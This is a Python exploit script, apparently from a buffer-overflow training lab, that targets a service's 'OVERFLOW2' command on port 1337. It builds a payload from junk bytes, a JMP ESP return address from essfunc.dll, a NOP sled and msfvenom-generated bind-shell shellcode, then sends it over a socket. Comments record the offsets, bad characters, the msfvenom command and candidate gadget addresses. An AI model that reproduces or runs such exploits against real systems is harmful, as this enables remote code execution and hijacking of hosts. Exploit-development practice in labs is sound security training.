import socket
import time


# Fuzzing shows crash at 700 bytes input

host = "10.10.5.232"
port = 1337

offset = 634
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")
nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xfc\xbb\x94\x37\x2d\x36\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x68\xdf\xaf\x36\x90"
    b"\x20\xd0\xbf\x75\x11\xd0\xa4\xfe\x02\xe0\xaf\x52\xaf\x8b\xe2"
    b"\x46\x24\xf9\x2a\x69\x8d\xb4\x0c\x44\x0e\xe4\x6d\xc7\x8c\xf7"
    b"\xa1\x27\xac\x37\xb4\x26\xe9\x2a\x35\x7a\xa2\x21\xe8\x6a\xc7"
    b"\x7c\x31\x01\x9b\x91\x31\xf6\x6c\x93\x10\xa9\xe7\xca\xb2\x48"
    b"\x2b\x67\xfb\x52\x28\x42\xb5\xe9\x9a\x38\x44\x3b\xd3\xc1\xeb"
    b"\x02\xdb\x33\xf5\x43\xdc\xab\x80\xbd\x1e\x51\x93\x7a\x5c\x8d"
    b"\x16\x98\xc6\x46\x80\x44\xf6\x8b\x57\x0f\xf4\x60\x13\x57\x19"
    b"\x76\xf0\xec\x25\xf3\xf7\x22\xac\x47\xdc\xe6\xf4\x1c\x7d\xbf"
    b"\x50\xf2\x82\xdf\x3a\xab\x26\x94\xd7\xb8\x5a\xf7\xbf\x0d\x57"
    b"\x07\x40\x1a\xe0\x74\x72\x85\x5a\x12\x3e\x4e\x45\xe5\x41\x65"
    b"\x31\x79\xbc\x86\x42\x50\x7b\xd2\x12\xca\xaa\x5b\xf9\x0a\x52"
    b"\x8e\x94\x02\xf5\x61\x8b\xef\x45\xd2\x0b\x5f\x2e\x38\x84\x80"
    b"\x4e\x43\x4e\xa9\xe7\xbe\x71\xc4\xab\x37\x97\x8c\x43\x1e\x0f"
    b"\x38\xa6\x45\x98\xdf\xd9\xaf\xb0\x77\x91\xb9\x07\x78\x22\xec"
    b"\x2f\xee\xa9\xe3\xeb\x0f\xae\x29\x5c\x58\x39\xa7\x0d\x2b\xdb"
    b"\xb8\x07\xdb\x78\x2a\xcc\x1b\xf6\x57\x5b\x4c\x5f\xa9\x92\x18"
    b"\x4d\x90\x0c\x3e\x8c\x44\x76\xfa\x4b\xb5\x79\x03\x19\x81\x5d"
    b"\x13\xe7\x0a\xda\x47\xb7\x5c\xb4\x31\x71\x37\x76\xeb\x2b\xe4"
    b"\xd0\x7b\xad\xc6\xe2\xfd\xb2\x02\x95\xe1\x03\xfb\xe0\x1e\xab"
    b"\x6b\xe5\x67\xd1\x0b\x0a\xb2\x51\x3b\x41\x9e\xf0\xd4\x0c\x4b"
    b"\x41\xb9\xae\xa6\x86\xc4\x2c\x42\x77\x33\x2c\x27\x72\x7f\xea"
    b"\xd4\x0e\x10\x9f\xda\xbd\x11\x8a\xda\x41\xee\x35"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW2 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 76413176
# ESP at crash: 019EFA30 -> 33764132

# EIP Pattern Offset: 634
# ESP (0x019efa30) points at offset 638

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x23, 0x3c, 0x83, 0xba

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x23\x3c\x83\xba'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
